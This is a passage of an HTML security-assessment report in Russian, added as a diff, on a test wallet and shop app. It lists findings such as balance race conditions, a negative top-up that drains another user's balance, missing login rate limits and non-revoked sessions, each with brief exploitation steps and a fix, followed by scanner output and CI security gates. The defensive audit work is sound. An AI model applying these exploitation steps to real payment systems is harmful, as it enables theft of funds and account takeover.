+UPDATE users SET balance_kop = balance_kop - $1 ...
+UPDATE checkout_quotes SET used=TRUE WHERE id=$1
+INSERT INTO orders ...</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Своя котировка.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Несколько заказов на одну котировку</span> в параллельном прогоне.</div>
+  <div class="field"><b>Фикс.</b> Одна транзакция и условное обновление <code>used=FALSE → TRUE</code> с проверкой числа строк.</div>
+</div>
+
+<!-- V-31 -->
+<div class="card">
+  <h3>V-31. Гонка возврата и отмены <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A04:2021 · CWE-362 · OW-06 · PoC: <code>poc/stage_registry_extra.py</code></div>
+  <div class="field"><b>Суть.</b> Возврат и отмена читают статус, затем отдельно меняют баланс и статус. Два запроса успевают увидеть <code>paid</code> и оба зачислить <code>total</code>.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_shop.go — orderReturn() / orderCancel(): SELECT status, затем UPDATE balance и UPDATE orders без транзакции</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Свой оплаченный заказ.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Повторное зачисление</span> при конкурентных возвратах.</div>
+  <div class="field"><b>Фикс.</b> <code>UPDATE … WHERE status IN ('paid','delivered')</code> в той же транзакции, что и кредит; вторая попытка должна получить 0 строк.</div>
+</div>
+
+<!-- V-32 -->
+<div class="card">
+  <h3>V-32. Ложный успех корзины и неактивный товар <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A04:2021 · CWE-252 · OW-11 · PoC: <code>poc/stage_money.py</code></div>
+  <div class="field"><b>Суть.</b> <code>cartAdd</code> вставляет <code>product_id</code> без проверки существования и флага <code>active</code>. Ошибка внешнего ключа проглатывается, пользователю всё равно пишется «Добавлено в корзину». Неактивный товар в корзину попадает и дальше участвует в оформлении.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_shop.go — cartAdd()
+_, _ = s.db.Exec(`INSERT INTO cart_items ... VALUES ($1,$2,1)`, u.ID, pid)
+s.flash(w, "Добавлено в корзину", true)</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">product_id=999</span> даёт flash успеха и 0 строк в корзине. Товар с <code>active=FALSE</code> отображается в корзине.</div>
+  <div class="field"><b>Фикс.</b> Вставлять только <code>active=TRUE</code>; flash успеха — после проверки <code>RowsAffected</code>.</div>
+</div>
+
+<!-- V-33 -->
+<div class="card">
+  <h3>V-33. Гонка чаевых <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A04:2021 · CWE-362 · OW-16 · PoC: <code>poc/stage_registry_extra.py</code></div>
+  <div class="field"><b>Суть.</b> Отправка чаевых читает баланс и затем двумя отдельными <code>UPDATE</code> списывает отправителя и зачисляет получателя. Два параллельных запроса проходят одну и ту же проверку и оба проводятся.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_money.go — tipsNew(): getUserByID, затем UPDATE balance отправителя и получателя без транзакции</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Баланс покрывает одну отправку, но не две.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Две проводки</span> при одном достаточном остатке.</div>
+  <div class="field"><b>Фикс.</b> Транзакция и <code>UPDATE … WHERE balance_kop &gt;= $1</code>.</div>
+</div>
+
+<!-- V-34 -->
+<div class="card">
+  <h3>V-34. Отрицательное кассовое пополнение <span class="sev high">High · CVSS 7.1</span></h3>
+  <div class="meta">A04:2021 · CWE-20 · OW-19 · PoC: <code>poc/stage_money.py</code></div>
+  <div class="field"><b>Суть.</b> Касса принимает сумму, если она разобралась и не равна нулю. Знак не проверяется: отрицательное «пополнение» уменьшает баланс выбранного логина и пишется как <code>topup</code>.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_accounting.go — cashierTopup()
+amount, err := parseRubToKop(r.FormValue("amount_rub"))
+if target == nil || err != nil || amount == 0 { ... }
+UPDATE users SET balance_kop = balance_kop + $1</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Роль cashier или admin.</div>
+  <div class="field"><b>Шаги.</b> <code>POST /cashier/topup</code> с отрицательной суммой на чужой логин.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Баланс жертвы уменьшается</span>, в журнале строка <code>topup</code> с минусом, flash «Пополнение выполнено».</div>
+  <div class="field"><b>Фикс.</b> Отклонять <code>amount &lt;= 0</code>.</div>
+</div>
+
+<!-- V-35 -->
+<div class="card">
+  <h3>V-35. Бухгалтерская корректировка без транзакции <span class="sev med">Medium · CVSS 5.3</span></h3>
+  <div class="meta">A04:2021 · CWE-362 · OW-22 · PoC: <code>poc/stage_registry_extra.py</code></div>
+  <div class="field"><b>Суть.</b> <code>accountingAdjust</code> меняет баланс и пишет операцию двумя запросами. Ошибка второго не откатывает первый, и наоборот: журнал и баланс расходятся.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_accounting.go — accountingAdjust(): UPDATE users, затем INSERT INTO operations</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Роль accountant или admin.</div>
+  <div class="field"><b>Результат.</b> <span class="ok">Частичная запись</span> при сбое одного из двух запросов.</div>
+  <div class="field"><b>Фикс.</b> Одна транзакция на баланс и журнал.</div>
+</div>
+
+<!-- V-36 -->
+<div class="card">
+  <h3>V-36. Вход без ограничения попыток <span class="sev med">Medium · CVSS 5.3</span></h3>
+  <div class="meta">A07:2021 · CWE-307 · OW-23 · PoC: <code>poc/stage_access.py</code></div>
+  <div class="field"><b>Суть.</b> <code>login</code> не считает ошибки, не ставит задержку и не блокирует учётку. Серия неверных паролей не меняет ответ и не закрывает следующий верный вход.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_auth.go — login(): при неверном пароле тот же ответ «Неверный логин или пароль», счётчика нет</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Шесть неверных попыток подряд</span>, затем верный пароль принимается.</div>
+  <div class="field"><b>Цепочки.</b> Самостоятельная. К сбросу пароля и к SQLi не ведёт: это соседние проверки, не ступени одной атаки. Так было записано в <code>main/CHAINS.md</code>.</div>
+  <div class="field"><b>Фикс.</b> Лимит попыток и задержка по логину и IP.</div>
+</div>
+
+<!-- V-37 -->
+<div class="card">
+  <h3>V-37. Блокировка пользователя не действует <span class="sev med">Medium · CVSS 6.5</span></h3>
+  <div class="meta">A07:2021 · CWE-285 · OW-28 · PoC: <code>poc/stage_access.py</code></div>
+  <div class="field"><b>Суть.</b> Бухгалтер ставит <code>users.blocked</code>, но <code>login</code> и <code>currentUser</code> этот флаг не смотрят. Заблокированный входит заново, уже выданная кука продолжает открывать кабинет. Проверка <code>NOT blocked</code> есть только на стороне получателя перевода.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_auth.go — login(): setSession без проверки u.Blocked
+// auth.go — currentUser(): подпись и загрузка пользователя, blocked не читается в решение</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Вход и старая сессия при blocked=true</span>.</div>
+  <div class="field"><b>Фикс.</b> Отказывать во входе и в <code>requireUser</code>, если <code>blocked</code>.</div>
+</div>
+
+<!-- V-38 -->
+<div class="card">
+  <h3>V-38. Выход не отзывает сессию <span class="sev high">High · CVSS 7.1</span></h3>
+  <div class="meta">A07:2021 · CWE-613 · OW-29 · PoC: <code>poc/stage_access.py</code></div>
+  <div class="field"><b>Суть.</b> Сессия — это HMAC-кука без серверного хранилища, срока и списка отзыва. <code>logout</code> только затирает куку в браузере. Копия <code>ow_session</code> открывает кабинет и после выхода.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// auth.go — clearSession(): Set-Cookie пустое, MaxAge=-1; на сервере записи сессии нет</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Копия куки (V-13/V-15 или доступ к браузеру).</div>
+  <div class="field"><b>Результат.</b> <span class="ok">GET / со старой кукой после /logout — 200</span>, кабинет открыт.</div>
+  <div class="field"><b>Фикс.</b> Серверные сессии со сроком и отзывом на выходе и при смене пароля.</div>
+</div>
+
+<!-- V-39 -->
+<div class="card">
+  <h3>V-39. Подмена вида операции при подтверждении перевода <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A04:2021 · CWE-345 · OW-44 · PoC: <code>poc/stage_registry_extra.py</code></div>
+  <div class="field"><b>Суть.</b> Черновик хранит <code>op_type</code>, но подтверждение заменяет его значением из POST, если поле непустое. Сумма берётся из черновика; меняется вид проводки (<code>transfer</code> / <code>tip_boss</code>).</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// handlers_money.go — transferConfirm()
+if v := r.FormValue("op_type"); v != "" { opType = v }</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">В журнале другой kind</span>, чем у черновика. Денежный эффект тот же, что у обычного перевода.</div>
+  <div class="field"><b>Фикс.</b> Вид операции только из черновика.</div>
+</div>
+
+<!-- V-40 -->
+<div class="card">
+  <h3>V-40. Ошибка хеширования при регистрации игнорируется <span class="sev low">Low · CVSS 4.3</span></h3>
+  <div class="meta">A07:2021 · CWE-252 · OW-24 · PoC: <code>poc/stage_access.py</code></div>
+  <div class="field"><b>Суть.</b> <code>hashPassword</code> на пароле длиннее 72 байт возвращает ошибку bcrypt, вызов её отбрасывает, в <code>password_hash</code> пишется пустая строка. Аккаунт создаётся, войти в него нельзя.</div>
+  <div class="field"><b>Расположение.</b> <pre><code>// handlers_auth.go — register(): hash, _ := hashPassword(pass)</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Строка пользователя с длиной хэша 0</span>, вход тем же паролем не проходит.</div>
+  <div class="field"><b>Фикс.</b> Не создавать учётку, если <code>hashPassword</code> вернул ошибку; ограничить длину пароля до хеширования.</div>
+</div>
+
+<div class="pagebreak"></div>
+<h2>Результаты сканеров</h2>
+<h3>Trivy — образ <code>work-app:latest</code> (SCA)</h3>
+<pre class="small"><code>Report Summary
+┌────────────────────────────────┬────────┬─────────────────┬─────────┐
+│ work-app:latest (debian 12.15) │ debian │       39        │    -    │   (HIGH:38, CRITICAL:1)
+│ app/wallet (gobinary)          │ gobin  │       38        │    -    │   (stdlib v1.22.12)
+└────────────────────────────────┴────────┴─────────────────┴─────────┘
+CRITICAL: CVE-2023-45853 (zlib1g)  — heap overflow
+CRITICAL: CVE-2025-68121 (stdlib)  — crypto/tls: incorrect cert validation on resumption</code></pre>
+<h3>Trivy — репозиторий (misconfig + secret)</h3>
+<pre class="small"><code>app/Dockerfile (dockerfile)          HIGH:1   DS-0002 нет USER (root)
+charts/.../app.yaml (helm)           6        KSV-0014 readOnlyRootFilesystem, KSV-0118 default securityContext (root), KSV-0012 runAsNonRoot, KSV-0001, KSV-0104 seccomp
+charts/.../mail.yaml, mock.yaml,     7-8      те же KSV + образ без тега / из untrusted registry
+charts/.../postgres.yaml</code></pre>
+<h3>Заголовки ответа (curl)</h3>
+<pre class="small"><code>Set-Cookie: ow_session=...; HttpOnly; Path=/; SameSite=Lax   (нет Secure)
+op_grant_*: HttpOnly нет — это кука V-11, не сессия
+нет Content-Security-Policy / X-Frame-Options / HSTS / X-Content-Type-Options   (V-22)</code></pre>
+<p class="small muted">Полные выгрузки: <code>artifacts/trivy-image.txt</code>, <code>artifacts/trivy-fs.txt</code>, <code>artifacts/headers-login.txt</code>, <code>artifacts/nuclei.txt</code>. Nmap/ZAP (GUI из <code>tools/</code>) — для ручного подтверждения сети и DAST-прогона.</p>
+
+<h2>Процесс DevSecOps: блокировка в CI</h2>
+<p>Файл <code>fixes/gitlab-ci.secure.yml</code> добавляет стадии и блокирует MR при находках, не отключая сами сканеры
+и критические алерты (учтён штраф по положению):</p>
+<ul>
+  <li><b>Secret scan</b> — gitleaks (V-01, V-26).</li>
+  <li><b>SAST</b> — gosec + semgrep (<code>p/golang</code>, <code>p/owasp-top-ten</code>): SQLi, SSTI, path traversal, XSS.</li>
+  <li><b>SCA</b> — govulncheck + <code>trivy fs</code> (vuln/secret/misconfig), <code>trivy image</code> собранного образа (V-28).</li>
+  <li><b>DAST</b> — ZAP baseline против временного деплоя; падение при риске High.</li>
+  <li><b>security_gate</b> на <code>merge_request</code>: любая находка в SARIF блокирует merge.</li>
+</ul>
+
+<h2>Приложения</h2>
+<p><b>PoC Kept</b> (<code>poc/kept/</code>, прогон <code>17/17</code> — <code>artifacts/poc-run.txt</code>): 01 ключи, 02 admin, 03 роль/деньги,
+04 SQLi-перевод, 05 SQLi-сверка, 06 SSTI/RCE, 07 traversal, 08 возврат, 09 IDOR-заказ, 10 IDOR-лента,
+11 supply, 12 платёж, 13 reflected XSS, 14 stored XSS, 15 ATO, 16 enum, 17 ошибки.</p>
+<p><b>PoC main</b> (<code>poc/</code>): <code>stage_access.py</code> (OW-23, OW-24, OW-26, OW-28, OW-29, OW-34, OW-35),
+<code>stage_money.py</code> (OW-01, OW-02, OW-05, OW-07, OW-11, OW-14, OW-17, OW-19, OW-21, OW-31),
+<code>stage_data.py</code> (OW-08, OW-09, OW-13, OW-14, OW-27, OW-34),
+<code>stage_xss.py</code> (OW-12, OW-30),
+<code>stage_registry_extra.py</code> (OW-03, OW-06, OW-10, OW-15, OW-16, OW-18, OW-20, OW-22, OW-25, OW-35…OW-44),
+<code>01_forged_session_and_payment.py</code>, <code>02_default_db_creds.py</code>, <code>03_slowloris.py</code>, <code>04_unlimited_db_pool.py</code>.
+Пошаговое описание: <code>poc/STEPS.md</code> и <code>poc/kept/STEPS.md</code>.</p>
+<p><b>Фиксы</b>: <code>fixes/PATCHES.md</code>, <code>fixes/Dockerfile.hardened</code>, <code>fixes/docker-compose.hardened.yml</code>,
+<code>fixes/k8s-securitycontext.yaml</code>, <code>fixes/gitlab-ci.secure.yml</code>.</p>
+<p class="small muted">Границы: боевые пароли из задания использованы только для ручной проверки; все PoC ходят на локальный стенд.
+CVSS-оценки приведены по 3.1 и отражают импакт на этом стенде.</p>
+
+</body>
+</html>
